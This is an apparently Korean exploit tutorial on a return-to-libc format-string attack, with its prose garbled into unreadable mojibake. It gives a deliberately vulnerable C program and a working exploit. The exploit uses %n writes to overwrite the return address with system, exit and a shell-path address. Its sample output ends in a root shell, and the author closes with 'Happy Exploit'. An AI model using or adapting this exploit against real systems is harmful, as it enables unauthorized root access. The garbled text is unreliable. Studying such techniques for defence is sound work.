
 =======================================================================================
  Title: return to library format string (Double format string Project 2)
  Author : À¯µ¿ÈÆ (Xpl017Elz) in INetCop
  E-mail : szoahc@hotmail.com
  Home: http://x82.inetcop.org
 =======================================================================================

 ´©°¡ ´Ù½Ã ÀÌ·± ¹®¼­¸¦ ¾µ ÁÙ ¾Ë¾Ò°Ú´Â°¡ --;
 ¿¹Àü¿¡ ½á¸Ô¾ú´ø º° È¿°ú¾ø´ø `ÀÏ¸í Double format string Project'¸¦ ´Ù½Ã ½á¸ÔÀ» ±âÈ¸°¡ ¿Ô´Ù. ++

 shellcode ÇÊ¿ä¾øÀÌ shellÀ» ¶ç¿î´Ù´Â °Ç È®½ÇÈ÷ °¡´ÉÇÏ´Ù. (format string attack À¸·Îµµ)
 ÀÌÀü¿¡´Â ¾î°ÅÁö½ÄÀ¸·Î ¿¹Á¦¸¦ ¸¸µé¾î¼­ ±×°ÍÀ» Áõ¸í(?) ÇØº¸¾ÒÁö¸¸... ¿ª½Ã ±×°Í¸¸À¸·Ğ ºÎÁ·ÇÏ´Ù.

 ÀÌ °ø°İÀº small buffer format string attackÃ³·³ ÀÛÀº ¹öÆÛ È¯°æ¿¡¼­ exploit ÇÒ ¼ö ÀÖ´Â
 ±×·± ¹æ¹ıÀ» Á¦°øÇÏÁö´Â ¾Ê´Â´Ù. ±×·¡¼­ ´ÜÁ¡ÀÌ¶ó°í ÇÏ°Ô µÇ¸é, ´Ù¼Ò ¸¹Àº Å©±âÀÇ ¹öÆÛ¸¦
 ¿ä±¸ÇÑ´Ù´Â Á¡ÀÌ´Ù. ±âº» 100byte ÀÌ»óµÇ´Â ¹öÆÛ¿¡¼­ È°¿ëµµ°¡ ÀÖ´Ù°í º¸¸é µÇ°Ú´Ù.

 ¹°·Ğ, °ø°İ ½Ã shellcode¸¦ °¨ÁöÇÏ´Â ´Éµ¿ÀûÀÎ ¼Ö·ç¼ÇÀ» ¼Ó¿© ¸Ô´Â´Ù´øÁö,
 RedHat 9.0¿¡¼­ ºÎÅÍ °øÆ÷·Î ´Ù°¡¿À°ÔµÈ ¹«ÀÛÀ§½Ä shellcode À§Ä¡ Âï¾î ³Ö±â¶ó´øÁö ...
 ±×·± È¯°æ¿¡¼­´Â ²Ï À¯¿ëÇÒ °ÍÀÌ´Ù.

 ¿¹Á¦¸¦ ¸¸µé¾î ¼º°øÇØµÎ°í ¿À·§µ¿¾È ¼­¹ö¿¡¼­ ½âÇû´ø ³ğµé Áß¿¡ ÇÏ³ª¸¦ ÀÌÁ¦¾ß ¹®¼­·Î ÀÛ¼ºÇÑ´Ù°í
 »ı°¢ÇÏ´Ï ÇÑÆíÀ¸·Ğ ÀÛ¼ºÀÚ°¡ ÇÑ½É½º·´±âµµ ÇÏ´Ù. ¶Ç, ÀÌ ±ÛÀ» ÀĞ´Â ºĞµé¿¡°Ô ÁË¼Û½º·´±âµµ ÇÏ´Ù.

 Âü°í·Î, ÀÌ ¹®¼­´Â ¿¹Àü ¹®¼­µéÃ³·³ ±×·¯ÇÑ °İ½ÄÀ» Ã£±â´Â Èûµé °Í °°´Ù.
 ¹¹ ÀÛ¼ºÀÚ°¡ ±ÍÂúÀº Å¿ÀÌ°ÚÁö¸¸. ±×·¯ÇÑ °İ½ÄÀ» °®Ãá ¹®¼­º¸´Ü ÆíÇÏ°Ô Á¢±ÙÇÏ¿© ¼³¸íÇÏ´Â °ÍÀÌ
 ¾î¶»°Ô º¸¸é ±ÛÀ» ÀĞ´Â »ç¶÷µéÀ» Áñ°Ì°Ô ÇÏ±â ¶§¹®ÀÌ¶ö±î? (¾Æ´Ï¶ó¸é ÁË¼Û. --;)

 ÀÚ, ±×·³ º»°İÀûÀÎ ¿¹Á¦¿Í ÇÔ²², exploit method¸¦ Á¦°øÇÏµµ·Ï ÇÏ°Ú´Ù.
 ¹¹, ÀÏ¹İÀûÀÎ °³³äÀÌ³ª °ø°İ ¹æ¹ıÀº ÀÌ¹Ì Double format string Project 1¿¡¼­ ´Ù ¹è¿ü´Ù.
 (À½.. ÇÁ·ÎÁ§Æ®¶ó°í ºÎ¸£±âµµ ¹Î¸ÁÇÏ´Ù.)
 ¾îÂ·µç, ´ÙÀ½ ¿¹Á¦¸¦ º¸ÀÚ.

 --
 /* code: vuln.c */

 main(int argc,char *argv[]) {
     char x[200];
     strcpy(x,argv[1]);
     printf(x);
 }
 --

 ¹¹ ÀÏ¹İÀûÀÎ ¿¹Á¦´Ù.
 ¿¨? buffer overflow°¡ ÀÏ¾î³ª´Â code ¾Æ´Ï³Ä°í? ¾Æ... ±×°Ç »ó°üÇÏÁö ¸¶¶ó.
 ¸ÛÃ»ÇÏ°Ô 200byteÀÇ ¹öÆÛ¸¦ ´Ù Àâ¾Æ¸Ô¾î ¹ö¸®´Â °Ç ¾Æ´Ï´Ï±ñ. --;
 printf(x); ÄÚµå ´öºĞ¿¡ »ç¿ëÀÚ´Â format string °ø°İÀ» ½ÃµµÇÒ ¼ö ÀÖ°í, shellcode¸¦ ÀÌ¿ëÇÏ¸é,
 ÀÏ¹İÀûÀÎ ¹®¼­¿Í ´Ù¸¦¹Ù ¾ø´Â *¾ÆÁÖ* ½¬¿î normal ¿¹Á¦ codeÀÌ´Ù.

 ÀÚ, ±×·³ Àú ³ğÀ» ¿ä¸®ÇÒ exploitÀ» Á¦°øÇÏµµ·Ï ÇÏ°Ú´Ù.
 ÀÛ¼ºÀÚ´Â ¾îÂî³ª ÀÌ³ğÀ» exploit ÇÏ±â ±ÍÂú¾Ò´øÁö --;; ¾ÆÁÖ ¹«½ÄÇÑ ¹æ¹ıÀ¸·Î °ø°İÇÑ´Ù.
 ¾î¶»°Ô º¸¸é, Project 1¿¡¼­ Á¦°øÇß´ø codeÀÇ 1% ¼öÁØ¿¡µµ ¸ø ¹ÌÄ¡´Â ... (Proof of ConceptÀÌ¶ó ºÒ·¯ÁÖ½Ã¿À.)
 ¹¹, ±×·±°Ô Áß¿äÇÑ °ÍÀº ¾Æ´Ï±â ¶§¹®¿¡ ´Ü¼øÇÑ ³ğÀ¸·Î ÁØºñÇØº¸¾Ò´Ù.

 --
 /* code: eat_vuln.c */
 main() {
     char x[200];
     int i=0;
     unsigned long sh=0xbffffb7c;
     memset((char *)x,0,sizeof(x));
     *(long*)&x[i]=0x41414141; i+=4;
     *(long*)&x[i]=sh ; sh+=2; i+=4;
     *(long*)&x[i]=0x41414141; i+=4;
     *(long*)&x[i]=sh ; sh+=2; i+=4;
     *(long*)&x[i]=0x41414141; i+=4;
     *(long*)&x[i]=sh ; sh+=2; i+=4;
     *(long*)&x[i]=0x41414141; i+=4;
     *(long*)&x[i]=sh ; sh+=2; i+=4;
     *(long*)&x[i]=0x41414141; i+=4;
     *(long*)&x[i]=sh ; sh+=2; i+=4;
     *(long*)&x[i]=0x41414141; i+=4;
     *(long*)&x[i]=sh ; sh+=2; i+=4;
     x[i++]='%';
     x[i++]='3';
     x[i++]='3';
     x[i++]='0';
     x[i++]='7';
     x[i++]='2';
     x[i++]='x';
     x[i++]='%';
     x[i++]='n';
     x[i++]='%';
     x[i++]='4';
     x[i++]='8';
     x[i++]='8';
     x[i++]='0';
     x[i++]='5';
     x[i++]='x';
     x[i++]='%';
     x[i++]='n';
     x[i++]='%';
     x[i++]='1';
     x[i++]='8';
     x[i++]='7';
     x[i++]='9';
     x[i++]='5';
     x[i++]='x';
     x[i++]='%';
     x[i++]='n';
     x[i++]='%';
     x[i++]='4';
     x[i++]='6';
     x[i++]='7';
     x[i++]='3';
     x[i++]='9';
     x[i++]='x';
     x[i++]='%';
     x[i++]='n';
     x[i++]='%';
     x[i++]='4';
     x[i++]='8';
     x[i++]='6';
     x[i++]='8';
     x[i++]='9';
     x[i++]='x';
     x[i++]='%';
     x[i++]='n';
     x[i++]='%';
     x[i++]='4';
     x[i++]='9';
     x[i++]='6';
     x[i++]='1';
     x[i++]='1';
     x[i++]='x';
     x[i++]='%';
     x[i++]='n';

     printf("%s\n",x);
     printf("%d\n",i);

     execl("./vuln","vuln",x,0);
 }
 --

 ¾î¶²°¡? ¾öÃ»³ª°Ô ¹«½ÄÇÑ ³ğ ¾Æ´Ñ°¡? ÈÄÈÊ...
 ÀÌ³ğÀº shellcode ¾øÀÌ return to library ±â¹ıÀ» ÀÌ¿ëÇØ¼­ shellÀ» ½ÇÇàÇÏ°Ô ÇØÁÙ °ÍÀÌ´Ù.
 (¹°·Ğ ÇÊÀÚÀÇ ¼­¹ö ÇÃ·§Æû¿¡¼­¸¸) code¸¦ ¼öÁ¤ÇÏ´Â »ç¶÷ Á¶Â÷ Â¥Áõ³ª°Ô ÇØ¹ö¸®´Â ±Ã±ØÀÇ code°¡ Åº»ıÇß´Ù. ¹ÇÈı..
 ¿©±â¼­, 0xbffffb7c ÁÖ¼Ò´Â vuln ÇÁ·Î±×·¥ÀÇ return addressÀÌ´Ù.

 return address´Â ¿ì¸®°¡ Ã£¾Æ³½ system ÁÖ¼Ò·Î ¸ÕÀú µ¤¾î¾º¿©Áú °ÍÀÌ°í, ±× ´ÙÀ½ exit ÁÖ¼Ò.
 ¸¶Áö¸·Àº "/bin/bash" SHELL º¯¼ö¿¡ ¸í½ÃµÈ shellÀÇ path°¡ Á¸ÀçÇÏ´Â ÁÖ¼Ò·Î µ¤¾î ¾º¿öÁú °ÍÀÌ´Ù.
 ±×·¸°Ô µÇ¸é, ÇÁ·Î±×·¥Àº segfault ¾øÀÌ ±ò²ûÇÏ°Ô shellÀ» ½ÇÇàÇÒ ¼ö ÀÖ°Ô µÈ´Ù.

 Àß ½ÇÇàµÇ¾ú´Ù¸é, ´ÙÀ½ º¸±âÀÇ °á°ú Ã³·³.

 --
 bash$ ./eat_vuln
 AAAA|ûÿ¿AAAA~ûÿ¿AAAAûÿ¿AAAAûÿ¿AAAAûÿ¿AAAAûÿ¿   
   
         ... Áß ·« ...

                             41414141
                                         ... Áß ·« ...
                                                     41414141
 ...
                                     41414141
                                                                 ... 41414141
             41414141 ...

             bash# id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 bash# exit
 exit

            ...

                                        ...


                                        41414141bash$
 --

 ¶ì¿ë... ^^ Á¤¸» ½±°Ô shellÀ» ¾òÀ» ¼ö ÀÖ¾ú´Ù. (ÃÑ 4byte align ÁÖ¼Ò°ª, 3¹øÀ» µ¤¾î¾²´Â ¼ÀÀÌ´Ù)
 ¹°·Ğ, ÀÚ½ÅÀÇ ¼­¹ö¿¡ system, exit, "/bin/sh" ÁÖ¼Ò¸¦ ´Ù Ã£¾Æ¼­ º¯È¯ÇØ¼­ ½á¸ÔÀ¸·Á¸é,
 ±×¸® ½±Áö ¾ÊÀ» °ÍÀÌ´Ù. (½±Áö ¾Ê´Ù±âº¸´Ü ±«·Ó°Ú±º ... --)

 ¸ğµç ÁÖ¼Ò¸¦ ÀÚµ¿À¸·Î Ã£°í, °è»êÇÏ¿© ´ëÀÔÇÏ°í exploitÇÏ´Â code¸¦ ¸¸µé¾î Á¦°øÇÏ°í ½ÍÀº ¸¶À½ÀÌ
 ±¼¶Ò°°Áö¸¸ ... ±ÍÂúÀº °ü°è·Î ¿©·¯ºĞµé¿¡°Ô ¸Ã±âµµ·Ï ÇÏ°Ú´Ù.

 ¾µ¸¸ÇÑ ÄÚµå¸¦ ¸¸µé¸é º¸³»ÁÖ±â ¹Ù¶õ´Ù. ^^;
 ¶ÇÇÑ, ÀÚ½ÅÀÇ ÄÚµå°¡ º¼ Ç°¾ø´Ù°í ÇÔºÎ·Î ¹«½ÃÇÏÁö ¸¶¶ó. Á¦ ¸ò¿¡ ¸Â°Ô ÀÏÇÏ´Â ÄÚµå¶ó¸é ¾Æ¹«¸®
 ¸ø »ı°å°í º¼ Ç°¾ø´Ù ÇØµµ È¯¿µÀÌ´Ù. :-}

 ±×·³, ´Ùµé Happy Exploit !!

 P.S: Á» ´õ ÀÚ¼¼ÇÑ ³»¿ëÀÇ format string attack ±ÛÀ» ÀĞ¾îº¸°í ½Í´Ù¸é, ¿À·¡Àü¿¡ ÀÛ¼ºÇß´ø ³ğÀÌ
      ÀÖ´Âµ¥, Âü°í URLÀ» ºÒ·¯ÁÖµµ·Ï ÇÏ°Ú´Ù.

      URL: http://x82.inetcop.org/h0me/papers/f.txt

      ÆäÀÌÁö°¡ ¾È ¶ß¸é, ¶ß±æ ±â´Ù¸®¸ç, »çÀÌÆ® ¿î¿µÀÚ¸¦ ¿ø¸ÁÇØ±æ ¹Ù¶õ´Ù.

      ¾Æ, ±×¸®°í. f.txt (format string ¿ø¸® ÀÌÇØ) -> Double format string Project 1 ->
      -> Double format string Project 2 ¼ø¼­·Î ÀĞ¾îÁÖ±æ ¹Ù¶õ´Ù.
      0x82-Small-format-kr.txt (ÀÛÀº ¹öÆÛ¿¡¼­ format string °ø°İ) <- ÀÌ³ğÀº ´ıÀÌ´Ù. ^^

      Àç¹Ì¾ø´Â ±Û, ³¡±îÁö ÀĞ¾îÁÖ¼Å¼­ °¨»çÇÕ´Ï´Ù.

